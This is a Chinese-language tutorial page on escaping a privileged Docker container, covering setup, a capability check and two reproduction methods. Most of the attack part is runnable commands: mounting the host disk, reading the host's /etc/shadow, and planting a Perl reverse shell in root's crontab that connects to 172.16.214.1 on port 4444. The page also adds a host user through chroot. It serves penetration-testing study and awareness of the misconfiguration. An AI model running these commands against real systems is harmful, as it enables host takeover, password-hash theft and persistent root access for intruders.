---
title: Privileged 特权模式容器逃逸

---

<center><h1>Privileged 特权模式容器逃逸</h1></center>

---

## 搭建

例如当前有个普通用户 teamssix，并且是在 docker 用户组内的

<img width="1200" src="/img/1650013515.png">

在普通用户下，使用 --privileged=true 创建一个容器

```bash
docker run --rm --privileged=true -it alpine
```

## 检测

在容器内部执行下面的命令，从而判断容器是不是特权模式，如果是以特权模式启动的话，CapEff 对应的掩码值应该为0000003fffffffff 或者是 0000001fffffffff

```bash
cat /proc/self/status | grep CapEff
```

## 复现

### 方法一

查看挂载磁盘设备

```plain
fdisk -l
```

<img width="1200" src="/img/1650014398.png">

在容器内部执行以下命令，将宿主机文件挂载到 /test 目录下

```json
mkdir /test && mount /dev/sda1 /test
```

尝试访问宿主机 shadow 文件，可以看到正常访问

```json
cat /test/etc/shadow
```

<img width="1200" src="/img/1650014420.png">

也可以在定时任务中写入反弹 shell

这里的定时任务路径是 Ubuntu 系统路径，不同的系统定时任务路径不一样

```json
echo $'*/1 * * * * perl -e \'use Socket;$i="172.16.214.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'' >> /test/var/spool/cron/crontabs/root
```

一分钟后，就能收到反弹回来的会话了，而且会话权限是宿主机 root 用户权限。

<img width="1200" src="/img/1650014458.png">

### 方法二

```bash
mount /dev/sda1 /mnt
chroot /mnt adduser john
```

通过新添加的用户登录

<Vssue />

<script>
export default {
    mounted () {
      this.$page.lastUpdated = "2022年4月15日"
    }
  }
</script>